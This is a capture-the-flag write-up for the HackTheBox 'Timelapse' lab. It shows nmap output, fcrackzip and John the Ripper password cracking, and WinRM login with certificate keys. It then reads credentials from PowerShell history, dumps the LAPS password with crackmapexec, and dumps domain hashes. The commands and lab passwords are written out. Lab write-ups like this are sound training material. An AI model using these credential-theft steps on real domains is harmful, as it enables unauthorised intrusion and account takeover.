# HackTheBox-Timelapse

## NMAP

```bash
PORT      STATE SERVICE       VERSION              
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version                                   
|_    bind                 
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-27 03:07:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped   
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa 
| Public Key bits: 2048                                                
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233 a199 4504 0859 013f b9c5 e4f6 91c3
|_SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
|_ssl-date: 2022-03-27T03:10:27+00:00; +7h59m59s from scanner time.                                                                           
| tls-alpn:                                                            
|_  http/1.1                                                           
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
64463/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cg
i-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/27%Time=623F6471%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-03-27T03:09:54
|_  start_date: N/A

```

From the nmap results we have port 88 which is kerberos and whenever we see this service running on a windows machine it means that's a `Domain Controller`so we are looking at `Active Directory` here and we also have the domain name as well which is `dc01.timelapse.htb` so let's add this in our `/etc/hosts` file

<img src="https://i.imgur.com/5byDtc8.png"/>

## PORT 389 (LDAP)

Checking for null authentication on LDAP as it can sometimes give us the usernames but it failed

<img src="https://i.imgur.com/aLlt6ZQ.png"/>

## PORT 139/445 (SMB)
Having smb service running, we can check what shares this machine has using `smbclient`

<img src="https://i.imgur.com/QOFpNDH.png"/>

Checking the `Shares` we have two folders here

<img src="https://i.imgur.com/oQfxF5P.png"/>

In `Dev` folder we have `winrm_backup.zip` so let's download that

<img src="https://i.imgur.com/S648zc6.png"/>

And in `HelpDesk` we have 3 document files regarding `LAPS` and an installer file for LAPS

<img src="https://i.imgur.com/kgg42kx.png"/>

LAPS here is Local Administrator Password Solution which randomizes administrator's password in the ad domain so that the administrator account's password isn't the same across the domain

The document files were related to installing LAPS on the DC so it was just about the documentation 

When unzipping the archive from smb share it was asking for a password

<img src="https://i.imgur.com/usfgS5m.png"/>

So using `fcrackzip` we can brutefroce the password for this zip archive

<img src="https://i.imgur.com/v1epVUP.png"/>

```bash
fcrackzip -u -D -p /opt/SecLists/Passwords/rockyou.txt ./winrm_backup.zip
```
Here the parameters are:

* -u, It will try to decompress the first file by calling unzip with the guessed password
* -D, This will use dictionary mode, fcrackzip will read passwords from a file which must contain one password per line
* -p, this is for specifying either a string or the wordlist

<img src="https://i.imgur.com/ZNt7lGH.png"/>

## Foothold 

After unzipping the archive we'll get a pfx (`legacyy_dev_auth.pfx`) file and it's a SSL certificate that contains both public and private keys which can be used for authentication that is protected by a password

I tried to read the certifiate with `openssl` and provided the same password that we got for the archive but it failed

<img src="https://i.imgur.com/JcKyQo3.png"/>

We can try to crack the password hash for this pfx file by running `pfx2john` to get the hash then running `johntheripper` to crack it

<img src="https://i.imgur.com/YGut6AT.png"/>

<img src="https://i.imgur.com/CWU3ti1.png"/>

And now we should be able to read the certificate 

<img src="https://i.imgur.com/aODh7iG.png"/>

Reading the certificate we can see a user name `Legacyy`, this  can be verified if it's actually a username on the machine by running `kebrute` to see if the user exists

<img src="https://i.imgur.com/wmL4zgI.png"/>

Since port 5986 is open which is WinRM over SSL and we need to use a certificate to authenticate to winrm, `evill-winrm` doesn't have the option to use pfx certificate so I though maybe we need to extract the public and private key certificate from pfx as it does have option to specify them

<img src="https://i.imgur.com/wtxMJVF.png"/>

<img src="https://i.imgur.com/unwEwbj.png"/>

And doing this, it worked

<img src="https://i.imgur.com/eyKkLsd.png"/>

In `C:\Users` we see user `svc_deploy` and `TRX`

<img src="https://i.imgur.com/LZQ7gHF.png"/>

## Privilege Escalation (svc_deploy)

As this is a AD box, we can try running bloodhound to enumerate the domain for potential paths for privilege escalation and other misconfigurations in the domain

<img src="https://i.imgur.com/LKt9y8r.png"/>

But after uploading it and importing, it was blocked by AV, I tried it through `IEX` as well but it still didn't worked

<img src="https://i.imgur.com/JRszi90.png"/>

Downloading sharphound.exe from here https://github.com/BloodHoundAD/SharpHound and running it worked

<img src="https://i.imgur.com/jV8JCBx.png"/>

<img src="https://i.imgur.com/gV6IEo1.png"/>

But when I uploaded the archive on bloodhound GUI it wasn't able to parse the files, so moving on I tried looking into the powershell history file and found the credentials for svc_deploy user

```powershell
more .\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

<img src="https://i.imgur.com/idtZiOZ.png"/>

So using the same commands for making a PSCredential object we can execute commands as svc_deploy

<img src="https://i.imgur.com/Wdzxutq.png"/>

Checking in which groups this user belongs to and, this is a member of LAPS_Reader group

<img src="https://i.imgur.com/F0kGWsW.png"/>

## Privilege Escalation (Administrator)

I tried looking into ways to read LAPS password and since we can't import scripts I tried running sharplaps.exe but it was caught by AV

https://github.com/swisskyrepo/SharpLAPS/

<img src="https://i.imgur.com/hwJFTJU.png"/>

So then I went through this article explaining how we can read LAPS password and it showed it through `crackmapexec` 

https://www.hackingarticles.in/credential-dumpinglaps/

<img src="https://i.imgur.com/F6HE1OD.png"/>

One thing to note that crackmapexec requires `lsassy` a python library in order to use cme's modules which wasn't on my distro so I had to install it 

<img src="https://i.imgur.com/ucC3C7s.png"/>

<img src="https://i.imgur.com/Ng2FfS3.png"/>

And after this the module for LASP worked and we got the password

```powershell
cme ldap 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
```

<img src="https://i.imgur.com/iBfPKpt.png"/>

<img src="https://i.imgur.com/PgxZjtz.png"/>

Alternatively we can get the clear text password through `AD-Module` which already comes installed with LAPS, we can check if it's available through `Get-Module -Name ActiveDirectory -ListAvailable` and then import it with `Import-Module -Name ActiveDirectory`

<img src="https://i.imgur.com/hSvYUXr.png"/>

I came across this post in configuring LAPS

https://adsecurity.org/?p=3164

So checking in which attribute we can find the clear text LAPS password

<img src="https://i.imgur.com/Maei0He.png"/>

```bash
Get-ADComputer -Identity "dc01" -Properties "ms-mcs-AdmPwd"
```

<img src="https://i.imgur.com/qNByajZ.png"/>

Being an administrator on domain controller we can then dump hashes from NTDS.dit file 

<img src="https://i.imgur.com/DEZmd6X.png"/>

<img src="https://i.imgur.com/hI6BI9e.png"/>

## References

- https://www.varonis.com/blog/microsoft-laps
- https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file
- https://github.com/BloodHoundAD/SharpHound
- https://www.hackingarticles.in/credential-dumpinglaps/


```
archive : supremelegacy
pfx : thuglegacy

`--CollectionMethod All --Domain timelapse.htb `

$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
```
